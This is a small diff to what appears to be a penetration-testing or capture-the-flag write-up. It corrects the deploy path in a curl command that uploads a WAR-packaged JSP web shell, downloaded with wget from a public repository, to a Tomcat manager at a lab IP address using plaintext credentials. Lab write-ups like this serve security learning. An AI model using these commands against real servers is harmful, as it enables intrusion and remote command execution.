@@ -1352,7 +1352,7 @@ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp
 
 zip -r backup.war cmd.jsp
 
-curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file backup.war 'http://10.129.15.214:8080/manager/text/deploy?path=backup&update=true'
+curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file backup.war 'http://10.129.15.214:8080/manager/text/deploy?path=/backup&update=true'
 ```
 
 <br>
